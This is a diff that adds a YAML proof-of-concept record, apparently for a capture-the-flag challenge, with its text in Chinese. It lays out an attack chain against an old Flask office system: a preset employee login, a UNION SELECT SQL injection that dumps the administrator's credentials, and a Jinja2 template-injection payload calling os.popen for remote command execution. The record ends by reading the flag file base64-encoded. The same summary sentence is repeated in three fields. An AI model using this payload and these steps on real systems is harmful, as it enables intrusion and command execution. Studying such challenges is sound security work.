@@ -1,0 +1,23 @@
+info:
+  name: OA-SSTI-RCE-a11
+  cve: ''
+  summary: 老旧Flask OA系统：SQL注入提权→Jinja2 SSTI→root RCE→base64编码读flag。攻击链：员工账号SQL注入dump
+    admin密码→admin登录→/admin notice_html_blob SSTI→popen RCE→env找flag路径→base64绕过HTML转义读flag内容
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: 老旧Flask OA系统：SQL注入提权→Jinja2 SSTI→root RCE→base64编码读flag。攻击链：员工账号SQL注入dump
+    admin密码→admin登录→/admin notice_html_blob SSTI→popen RCE→env找flag路径→base64绕过HTML转义读flag内容
+  steps:
+  - 1. 用预置账号2001/Sys@Oa123登录普通员工
+  - 2. 在/dashboard搜索框用SQL注入UNION SELECT dump users表管理员凭据
+  - 3. 用admin凭据登录获得admin session cookie
+  - 4. 访问/admin找到notice_html_blob模板编辑区
+  - 5. 注入{{namespace.__init__.__globals__.os.popen("cmd").read()}}确认RCE
+  - 6. env定位DYNAMIC_FLAG_PATH=/challenge/flag.txt
+  - 7. cat /challenge/flag.txt | base64 绕过HTML截断读取flag
+  payload: '{{namespace.__init__.__globals__.os.popen("cat /flag | base64").read()}}'
+  verification: 老旧Flask OA系统：SQL注入提权→Jinja2 SSTI→root RCE→base64编码读flag。攻击链：员工账号SQL注入dump
+    admin密码→admin登录→/admin notice_html_blob SSTI→popen RCE→env找flag路径→base64绕过HTML转义读flag内容
